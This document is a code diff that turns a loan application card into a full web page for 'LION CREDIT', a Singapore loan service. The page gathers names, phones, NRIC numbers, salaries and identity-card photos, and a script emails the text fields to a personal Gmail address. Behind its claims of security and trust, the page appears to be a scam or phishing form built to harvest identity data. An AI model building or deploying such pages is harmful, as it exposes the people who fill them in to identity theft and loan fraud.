@@ -1,22 +1,149 @@
-<div class="card">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LION CREDIT - Singapore Loan Service</title>
 
-<h3>Loan Application</h3>
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: Arial, sans-serif;
+}
+
+/* ===== BACKGROUND HERO ===== */
+.hero{
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  text-align:center;
+  padding:40px;
+
+  background:
+    linear-gradient(rgba(0,0,0,0.72), rgba(0,0,0,0.88)),
+    url("https://images.unsplash.com/photo-1508964942454-1a56651d54ac?auto=format&fit=crop&w=1800&q=80");
+  background-size:cover;
+  background-position:center;
+  color:white;
+}
+
+.logo{
+  font-size:26px;
+  color:#D4AF37;
+  font-weight:bold;
+}
+
+h1{
+  font-size:48px;
+  color:#D4AF37;
+  margin-top:10px;
+}
+
+.subtitle{
+  margin-top:10px;
+  opacity:0.85;
+}
+
+/* ===== CARD ===== */
+.card{
+  margin-top:30px;
+  width:100%;
+  max-width:520px;
+  background:rgba(17,24,39,0.88);
+  padding:25px;
+  border-radius:14px;
+  backdrop-filter: blur(10px);
+  border:1px solid rgba(212,175,55,0.25);
+  box-shadow:0 0 25px rgba(212,175,55,0.15);
+}
+
+input, select, textarea{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:8px;
+  border:none;
+  outline:none;
+}
+
+textarea{
+  height:80px;
+}
+
+button{
+  width:100%;
+  margin-top:15px;
+  padding:14px;
+  background:linear-gradient(90deg,#D4AF37,#ffcc66);
+  border:none;
+  border-radius:8px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+button:hover{
+  transform:scale(1.02);
+}
+
+/* FEATURES */
+.features{
+  display:flex;
+  gap:12px;
+  flex-wrap:wrap;
+  justify-content:center;
+  margin-top:30px;
+}
+
+.feature{
+  background:rgba(255,255,255,0.06);
+  padding:12px;
+  border-radius:10px;
+  width:160px;
+  font-size:13px;
+  border:1px solid rgba(255,255,255,0.08);
+}
+
+/* small text */
+small{
+  opacity:0.6;
+  display:block;
+  margin-top:10px;
+  font-size:11px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="hero">
+
+<div class="logo">LION CREDIT</div>
+
+<h1>Singapore Loan Service</h1>
+<p class="subtitle">Fast Approval • Secure • Trusted Financial Consultation</p>
+
+<!-- FORM -->
+<div class="card">
 
 <input id="name" placeholder="Full Name">
 <input id="phone" placeholder="Phone Number">
 
-<!-- NEW: IC NUMBER -->
+<!-- IC -->
 <input id="ic" placeholder="IC / NRIC Number">
 
 <input id="company" placeholder="Company Name">
 <input id="address" placeholder="Company Address">
 <input id="salary" placeholder="Monthly Salary (SGD)">
 
-<!-- NEW: FILE UPLOAD -->
-<p style="text-align:left;margin-top:10px;">Upload IC Front</p>
+<!-- UPLOAD -->
+<p style="text-align:left;margin-top:10px;font-size:12px;">IC Front</p>
 <input type="file" id="icFront" accept="image/*">
 
-<p style="text-align:left;margin-top:10px;">Upload IC Back</p>
+<p style="text-align:left;margin-top:10px;font-size:12px;">IC Back</p>
 <input type="file" id="icBack" accept="image/*">
 
 <select id="loanType">
@@ -34,8 +161,55 @@
 
 <button onclick="sendEmail()">Submit Application</button>
 
-<p style="font-size:10px;opacity:0.6;margin-top:10px;">
-By submitting, you agree to identity verification for loan assessment purposes.
-</p>
+<small>
+By submitting this form, you agree to identity verification for financial assessment purposes.
+</small>
 
 </div>
+
+<!-- FEATURES -->
+<div class="features">
+<div class="feature">Fast Approval</div>
+<div class="feature">No Hidden Fees</div>
+<div class="feature">Secure Process</div>
+</div>
+
+</div>
+
+<script>
+function sendEmail(){
+
+  const name = document.getElementById("name").value;
+  const phone = document.getElementById("phone").value;
+  const ic = document.getElementById("ic").value;
+  const company = document.getElementById("company").value;
+  const address = document.getElementById("address").value;
+  const salary = document.getElementById("salary").value;
+  const loanType = document.getElementById("loanType").value;
+  const amount = document.getElementById("amount").value;
+  const note = document.getElementById("note").value;
+
+  const subject = "Loan Application - " + name;
+
+  const body =
+`NEW APPLICATION
+
+Name: ${name}
+Phone: ${phone}
+IC: ${ic}
+Company: ${company}
+Address: ${address}
+Salary: ${salary}
+Loan Type: ${loanType}
+Amount: ${amount}
+Note: ${note}`;
+
+  window.location.href =
+  "mailto:weifan168188@gmail.com"
+  + "?subject=" + encodeURIComponent(subject)
+  + "&body=" + encodeURIComponent(body);
+}
+</script>
+
+</body>
+</html>
